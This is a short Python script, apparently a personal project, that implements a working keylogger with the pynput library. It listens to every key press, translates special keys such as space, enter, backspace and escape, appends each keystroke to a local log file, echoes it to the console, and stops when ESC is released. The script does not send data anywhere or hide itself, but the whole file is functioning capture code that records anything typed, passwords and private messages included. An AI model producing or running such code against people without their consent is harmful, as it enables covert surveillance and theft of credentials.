import pynput
from pynput.keyboard import Key, Listener

keys = []
current_input = ""  # Store the currently typed characters

def on_press(key):
    global current_input
    key_str = ""
    
    try:
        # If it's an alphanumeric key, add it to the log
        key_str = key.char
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            key_str = ' '  # Space should be recorded as a space
        elif key == Key.enter:
            key_str = '\n'  # New line for the Enter key
        elif key == Key.backspace:
            if current_input:
                # Remove the last character if there's one to delete
                current_input = current_input[:-1]
                key_str = '[BACKSPACE]'
            else:
                key_str = ''  # Don't do anything if no input to remove
        elif key == Key.caps_lock:
            key_str = ''  # Ignore Caps Lock
        elif key == Key.shift or key == Key.shift_r:
            key_str = ''  # Ignore Shift keys
        elif key == Key.esc:
            key_str = '[ESC]'  # Represent ESC key when pressed
        else:
            key_str = f'[{key}]'  # Represent other special keys

    if key_str:
        # Only log visible characters and non-backspace ones
        if key_str != '[BACKSPACE]':
            current_input += key_str  # Update current_input with the logged key
        write_file(key_str)  # Log the key into the file
        print(f"Key logged: {key_str}")

def write_file(key_str):
    log_file_path = '/Users/Neha_Kohli/Desktop/Keylogger/log.txt'
    with open(log_file_path, 'a') as f:
        f.write(key_str)  # Write the key to the log file

def on_release(key):
    # Stop the listener when the ESC key is pressed
    if key == Key.esc:
        return False

# Start listening to the keyboard inputs
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
